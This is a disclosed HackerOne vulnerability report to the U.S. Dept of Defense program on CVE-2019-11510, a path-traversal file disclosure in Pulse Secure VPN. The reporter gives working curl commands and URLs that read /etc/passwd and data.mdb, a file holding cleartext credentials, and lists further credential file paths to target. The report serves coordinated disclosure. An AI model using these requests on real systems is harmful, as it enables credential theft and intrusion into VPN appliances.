---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-12-02
submitted: 2019-08-12T14:34:14.634Z
bounty_usd: null
votes: 31
cve: "CVE-2019-11510"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "alyssa_herrera"
source: "https://hackerone.com/reports/671749"
title: "Pulse Secure File disclosure, clear text and potential RCE"
---
# Pulse Secure File disclosure, clear text and potential RCE

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 31 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-12-02

- Report: [https://hackerone.com/reports/671749](https://hackerone.com/reports/671749)
- CWE: OS Command Injection | CVE: CVE-2019-11510
- Submitted: 2019-08-12T14:34:14.634Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Pulse Secure has two main vulnerabilities that allow file disclosure and post auth RCE
**Description:**
CVE-2019-11510  is a file disclosure due to some normalization issues in pulse secure. I was able to reproduce this by  grabbing in the etc/passswd. 
https://$hax/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

Though the impact of that is very limited, medium to high sec at best. From here we can grab a specific file.

The file /data/runtime/mtmp/lmdb/dataa/data.mdb contains clear context passwords and usernames, when a user logs in from here we can then access the Pulse secure instance. I stopped here due to not wanting to break the rules of engagements but from here I would log in then exploit a Post auth exploit.


Here's a list of files that an attacker would instantly hit
/data/runtime/mtmp/system
/data/runtime/mtmp/lmdb/dataa/data.mdb
/data/runtime/mtmp/lmdb/dataa/lock.mdb
/data/runtime/mtmp/lmdb/randomVal/data.mdb
/data/runtime/mtmp/lmdb/randomVal/lock.mdb
## Impact
Critical 
## Step-by-step Reproduction Instructions
We can only do this  using due to browsers messing up the exploit

curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://███/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

## Product, Version, and Configuration (If applicable)
Pulse Secure
## Suggested Mitigation/Remediation Actions
Patch pulse immediately

## Impact

An attacker will be able to download internal files and specifically target a local file which stores clear text passwords when a user login. This also an attacker to access highly sensitive internal areas and even can perform command execution

## Timeline

- **Report Filed**
- **2019-08-12** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-08-12** @alyssa_herrera: Well hackerone ate the exploit so here it is again with formating now!

```
curl --path-as-is -k -D https://███/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://█████/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#
```
- **Report Severity Updated**
- **Report Triaged**
- **2019-08-12** @alyssa_herrera: /data/runtime/mtmp/system stores hashed passwords so it's another trivial area to exploit if insecure passwords are being used. I'll be checking other mil systems to see if i can find anymore instances of this
- **2019-08-13** @agent-0g: @alyssa_herrera Someone was at BlackHat this year! :-)
- **2019-08-13** @alyssa_herrera: I was speaking at app sec village and was hanging out at the DC Furs but didn't actually go to defcon to see the talk. Me and my friend managed to reverse the PoC off of what little was disclosed though.

It's really cool stuff. 

@cdl sent in one for another Mil server. So will busy week for you guys
- **2019-08-13** @agent-0g: @alyssa_herrera Definitely cool! I think we're going to see an influx of these reports in the next few weeks. The more the merrirer, IMO!
- **2019-08-13** @alyssa_herrera: It's heavily prevalent nearly every where and a lot of DoD/USGOV servers run it so hopefully they're all reported
- **2019-09-05** @alyssa_herrera: Also me and few other researchers dug into the potential scale of this attack could unleash which you might find interesting.

https://medium.com/bugbountywriteup/pulse-secure-ssl-vpn-post-auth-rce-to-ssh-shell-2b497d35c35b
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
